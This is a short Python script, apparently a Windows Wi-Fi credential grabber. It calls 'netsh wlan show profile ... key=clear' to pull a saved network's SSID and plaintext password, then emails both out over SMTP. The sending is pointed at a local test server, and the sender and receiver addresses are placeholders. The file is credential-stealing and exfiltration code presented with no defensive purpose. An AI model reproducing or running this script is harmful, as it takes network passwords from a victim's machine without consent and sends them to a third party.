import subprocess
import re
import smtplib
import ssl

def replace_special_character(origin_list):
    new_list = []
    for item in origin_list:
        item = item.replace("\r", "")
        new_list.append(item)
    return new_list


def get_wifi_password():
    command1 = "netsh wlan show profile"
    result = subprocess.check_output(command1, shell=True)
    ssid = re.findall(r"\s*All User Profile\s*: (.*)", result, re.I | re.M)
    correct_ssid = replace_special_character(ssid)

    command2 = "netsh wlan show profile " + correct_ssid[0] + " key=clear"
    result = subprocess.check_output(command2, shell=True)
    password = re.findall(r"\s*Key Content\s*: (.*)", result, re.I | re.M)
    correct_password = replace_special_character(password)
    return correct_ssid[0], correct_password[0]


def send_email(ssid, password):
	# creates SMTP session 
	s = smtplib.SMTP('127.0.0.1', 1025)
	  
	# start TLS for security 
	# s.starttls()
	  
	# Authentication 
	# s.login("sender_email_id", "sender_email_id_password")
	  
	# message to be sent 
	message = """\
            Subject: Wifi SSID and password

            SSID is {}, password is {}""".format(ssid, password)
	  
	# sending the mail 
	s.sendmail("sender_email_id", "receiver_email_id", message) 
	  
	# terminating the session 
	s.quit()


if __name__ == "__main__":
    ssid, password = get_wifi_password()
    send_email(ssid, password)
